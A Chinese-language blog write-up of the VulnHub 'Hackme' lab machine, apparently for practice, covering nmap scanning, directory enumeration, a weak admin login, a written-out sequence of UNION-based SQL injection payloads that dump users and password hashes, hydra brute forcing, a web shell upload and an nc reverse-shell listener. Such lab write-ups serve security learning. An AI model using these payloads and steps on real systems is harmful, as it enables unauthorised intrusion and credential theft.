---
layout: post
title: "vulnhub-Hackme-隧道建立SQL注入详细解题思路清晰"
date: 2025-03-14 16:53:52 +0800
description: "vulnhub-Hackme-隧道建立、SQL注入、详细解题、思路清晰。"
keywords: "vulnhub-Hackme-隧道建立、SQL注入、详细解题、思路清晰。"
categories: ['靶场之路报错大师Ruturn404的网络警犬练习记录']
tags: ['数据库', 'Sql', 'Oracle']
artid: "146261474"
image:
    path: https://api.vvhan.com/api/bing?rand=sj&artid=146261474
    alt: "vulnhub-Hackme-隧道建立SQL注入详细解题思路清晰"
render_with_liquid: false
featuredImage: https://bing.ee123.net/img/rand?artid=146261474
featuredImagePreview: https://bing.ee123.net/img/rand?artid=146261474
cover: https://bing.ee123.net/img/rand?artid=146261474
image: https://bing.ee123.net/img/rand?artid=146261474
img: https://bing.ee123.net/img/rand?artid=146261474
---

<div class="blog-content-box">
 <div class="article-header-box">
  <div class="article-header">
   <div class="article-title-box">
    <h1 class="title-article" id="articleContentId">
     vulnhub-Hackme-隧道建立、SQL注入、详细解题、思路清晰。
    </h1>
   </div>
  </div>
 </div>
 <article class="baidu_pl">
  <div class="article_content clearfix" id="article_content">
   <link href="../../assets/css/kdoc_html_views-1a98987dfd.css" rel="stylesheet"/>
   <link href="../../assets/css/ck_htmledit_views-704d5b9767.css" rel="stylesheet"/>
   <div class="htmledit_views" id="content_views">
    <h2>
     vulnhub-Hackme-隧道建立、SQL注入、详细解题、思路清晰。
    </h2>
    <h3>
     一、信息收集 2025.3.14 PM 12：18
    </h3>
    <h4>
     1、主机发现
    </h4>
    <p>
     arp-scan -l
    </p>
    <p class="img-center">
     <img alt="" height="256" src="https://i-blog.csdnimg.cn/img_convert/cb1976864fc94e567c84a11491a335a8.png" width="754"/>
    </p>
    <p>
     nmap -sn 192.168.66.0/24
    </p>
    <p class="img-center">
     <img alt="" height="495" src="https://i-blog.csdnimg.cn/img_convert/9b3d73790d75da4aaeed581e89b7ae21.png" width="625"/>
    </p>
    <h4>
     2、端口扫描
    </h4>
    <pre><code>1、nmap --min-rate 10000 -p- 192.168.66.182 -oA port
查看所有开放端口
</code></pre>
    <p>
    </p>
    <p class="img-center">
     <img alt="" height="289" src="https://i-blog.csdnimg.cn/img_convert/585cbba6aa264420c0d034591bd33483.png" width="778"/>
    </p>
    <pre><code>2、map -sS -sV 192.168.66.182
附带服务版本信息，详细扫描
</code></pre>
    <p>
    </p>
    <p class="img-center">
     <img alt="" height="323" src="https://i-blog.csdnimg.cn/img_convert/1514118ffc488e82a61feaf6dfd5b545.png" width="738"/>
    </p>
    <h4>
     3、vuln扫描
    </h4>
    <pre><code>nmap --script=vuln -p 22,80 192.168.66.182
这里也是慢慢捡起来其他工具，这个可以扫描以往受到的攻击，扫描看一下
</code></pre>
    <h4>
     4、后台扫目录
    </h4>
    <pre><code>dirb http://192.168.66.182
dirsearch -u http://192.168.66.182/ -e * -i 200
nikto -h 192.168.66.182 -p 80
扫描一下目录
</code></pre>
    <h4>
     5、访问80端口
    </h4>
    <p>
     1、sql注入
    </p>
    <p>
    </p>
    <p class="img-center">
     <img alt="" height="605" src="https://i-blog.csdnimg.cn/img_convert/5217b1abc0aa041da0644150d970064d.png" width="1311"/>
    </p>
    <p>
    </p>
    <p class="img-center">
     <img alt="" height="701" src="https://i-blog.csdnimg.cn/img_convert/57def1a23dc5e622faa203bb9288c94f.png" width="1963"/>
    </p>
    <p>
     这里一个弱口令admin、123456登录成功，我们看一下有什么功能吧
    </p>
    <p>
    </p>
    <p class="img-center">
     <img alt="" height="1046" src="https://i-blog.csdnimg.cn/img_convert/628b7c3b2c0a0e2c642df76191ac1d9b.png" width="1499"/>
    </p>
    <p>
     我们翻译一下是一个图书管理后台，我们还是一个管理员身份，这里万能语法可以生效，尝试一下有没有过滤吧 Ⅰ、判断是否存在sql注入
    </p>
    <pre><code>OSINT' and 1=1#
OSINT' and 1=2#
这两段代码来判断是否存在sql注入，我们输入第二段代码返回异常或者无回显说明我们注入成功
</code></pre>
    <p>
     或者我们使用'发现可以回显所有书名
    </p>
    <p class="img-center">
     <img alt="" height="550" src="https://i-blog.csdnimg.cn/img_convert/1fec9f155f3976d8feaccabe67203773.png" width="932"/>
    </p>
    <p>
     Ⅱ、判断字段数
    </p>
    <pre><code>OSINT' order by 4
这里也是判断了字段数
</code></pre>
    <p>
    </p>
    <p class="img-center">
     <img alt="" height="527" src="https://i-blog.csdnimg.cn/img_convert/a02903d7d669d379e88d8a078b57c744.png" width="1474"/>
    </p>
    <pre><code>OSINT' union select 1,2,3 -- +
确定显示位
使用 UNION 命令来查找其中存在的列数，这里到4就没有回显了，我们判断又3列
</code></pre>
    <p>
     Ⅲ、查询数据库版本和存在的数据库，这里因为是又三个回显点
    </p>
    <pre><code>OSINT' union select version(),database(),3#
</code></pre>
    <p>
    </p>
    <p class="img-center">
     <img alt="" height="243" src="https://i-blog.csdnimg.cn/img_convert/caded3170c1e502f16f0a43eff95e6fa.png" width="919"/>
    </p>
    <p>
     这些基本信息都能爆出来，我们接着爆库
    </p>
    <p>
     Ⅳ、爆列 ok,这里也是调试好了，这两条语法都可以查询到，这里应该也算是万能语法，只是把列数确定好，把表名爆出来就大差不差了。这两个语法貌似没什么区别
    </p>
    <p>
     OSINT' union select group_concat(table_name),2,3 from information_schema.tables where table_schema="webapphacking"#
    </p>
    <p>
     OSINT' union select (select group_concat(table_name)),2,3 from information_schema.tables where table_schema="webapphacking" -- +
    </p>
    <p>
    </p>
    <p class="img-center">
     <img alt="" height="409" src="https://i-blog.csdnimg.cn/img_convert/d2b6fbd6145875b915bfe9be19c5f2e1.png" width="1126"/>
    </p>
    <p>
     这里一个books一个users，我们加下来吧这两个爆出来 Ⅴ、爆users表
    </p>
    <p>
     OSINT' union select group_concat(column_name),2,3 from information_schema.columns where table_name="users" -- +
    </p>
    <p>
     OSINT' union select group_concat(column_name),2,3 from information_schema.columns where table_name="users"#
    </p>
    <p class="img-center">
     <img alt="" height="274" src="https://i-blog.csdnimg.cn/img_convert/ef731705d58dbef67f413b2c12b40d51.png" width="1213"/>
    </p>
    <p>
     这里我们只需要爆出user和pasword即可，或者其他表格也能爆出来
    </p>
    <p>
     OSINT' union select group_concat(user),group_concat(pasword),3 from users#
    </p>
    <p>
    </p>
    <p class="img-center">
     <img alt="" height="840" src="https://i-blog.csdnimg.cn/img_convert/0ef7a5fd4b60620cf82cc4a72e010ff5.png" width="2474"/>
    </p>
    <p>
     这里我们就需要鉴定一下加密类型了
    </p>
    <p>
    </p>
    <p class="img-center">
     <img alt="" height="197" src="https://i-blog.csdnimg.cn/img_convert/171903f709df936cd54bbdde31bfb884.png" width="620"/>
    </p>
    <p>
     这里是md5加密，然后我们拿去解密尝试进行ssh登录
    </p>
    <p>
    </p>
    <p class="img-center">
     <img alt="" height="208" src="https://i-blog.csdnimg.cn/img_convert/7bfc5b42a1dde04368570050cda6160d.png" width="697"/>
    </p>
    <p>
     得到了一丢密码，拿去hydra爆破一下，失败了，我们拿这些账户登录一下这个端口，看看有没有其他信息
    </p>
    <h4>
     6、寻找突破口
    </h4>
    <p>
    </p>
    <p class="img-center">
     <img alt="" height="485" src="https://i-blog.csdnimg.cn/img_convert/fc72f4d4b9e51d9395ec2f0f0c8fc268.png" width="1346"/>
    </p>
    <p>
     这里原来是有用户名，而不是我们得到的user1，这次我们可以尝试hydra了
    </p>
    <p>
    </p>
    <p class="img-center">
     <img alt="" height="659" src="https://i-blog.csdnimg.cn/img_convert/6ab3b7840fd4917818e736c1cde0b4e6.png" width="1922"/>
    </p>
    <p>
     这里有个惊喜啊，文件上传太熟了，赶紧丢个后门测试测试
    </p>
    <p class="img-center">
     <img alt="" height="314" src="https://i-blog.csdnimg.cn/img_convert/1638f0c9bd83c4dbeeb93873aa3f4726.png" width="946"/>
    </p>
    <p>
     笑了，上传到upload了是吧，和我们之前的uploads文件夹呼应了，我们去uploads看一下什么情况
    </p>
    <p>
    </p>
    <p class="img-center">
     <img alt="" height="658" src="https://i-blog.csdnimg.cn/img_convert/6f97fa77feab0132e4826cec7d8dbfa3.png" width="1086"/>
    </p>
    <p>
     给爷整笑了，这里出现了一个png，我们上传一句话然后nc反连一下
    </p>
    <p>
     2、后台目录
    </p>
    <p>
    </p>
    <p class="img-center">
     <img alt="" height="577" src="https://i-blog.csdnimg.cn/img_convert/6b39f978490b24dcfc8dcb5e3da62b39.png" width="962"/>
    </p>
    <h4>
     7、隧道建立
    </h4>
    <p>
     nc -lvp 6666
    </p>
    <p>
    </p>
    <p class="img-center">
     <img alt="" height="678" src="https://i-blog.csdnimg.cn/img_convert/24395b437b5d2f5d7faf5756cd53bdc9.png" width="757"/>
    </p>
    <p>
     这次上传了php.png连接不到不知道是什么原因，但是php文件是可以连到的
    </p>
    <p class="img-center">
     <img alt="" height="525" src="https://i-blog.csdnimg.cn/img_convert/9c10acbcae2d2b132ca6c6ac8d3dbdad.png" width="747"/>
    </p>
    <p>
     我们修复一下shell
    </p>
    <p>
     这里提权真的很垃圾啊，也可能是这个太简单了，主要是想不到这一点，这个touchmenot执行就提权了。
    </p>
    <p class="img-center">
     <img alt="" height="395" src="https://i-blog.csdnimg.cn/img_convert/4ad76046f56e307b585d8a6c26c7822d.png" width="796"/>
    </p>
    <p>
     后续我也会出更多打靶文章，希望大家关注！谢谢
    </p>
   </div>
  </div>
 </article>
 <p alt="687474:70733a2f2f626c6f672e6373646e2e6e65742f5a65755f732f:61727469636c652f64657461696c732f313436323631343734" class_="artid" style="display:none">
 </p>
</div>


